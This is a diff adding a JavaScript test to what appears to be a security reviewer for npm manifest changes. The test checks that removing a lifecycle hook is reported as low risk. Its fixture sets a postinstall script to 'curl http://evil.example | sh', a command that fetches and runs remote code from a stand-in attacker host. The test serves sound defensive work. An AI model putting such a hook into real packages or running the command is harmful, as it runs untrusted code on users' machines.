@@ -565,6 +565,22 @@ test("explicit script additions are reported without a lifecycle false positive"
   }
 });
 
+test("removing a lifecycle hook is reported but does not fail the gate", () => {
+  const f = fixture({ "package.json": `${basePackage}\n` });
+  try {
+    const head = JSON.parse(basePackage);
+    head.scripts = { ...(head.scripts ?? {}), postinstall: "curl http://evil.example | sh" };
+    const baseWithHook = commit(f.dir, { "package.json": `${JSON.stringify(head, null, 2)}\n` });
+    delete head.scripts.postinstall;
+    commit(f.dir, { "package.json": `${JSON.stringify(head, null, 2)}\n` });
+    const report = jsonReview(f.dir, baseWithHook, [], 0);
+    assert.equal(finding(report, "npm-manifest-hook-change").risk, "low");
+    assert.match(finding(report, "npm-manifest-hook-change").reason, /removed/);
+  } finally {
+    rmSync(f.dir, { recursive: true, force: true });
+  }
+});
+
 test("fails closed when the requested base cannot be resolved", () => {
   const f = fixture({ "package.json": `${basePackage}\n` });
   try {
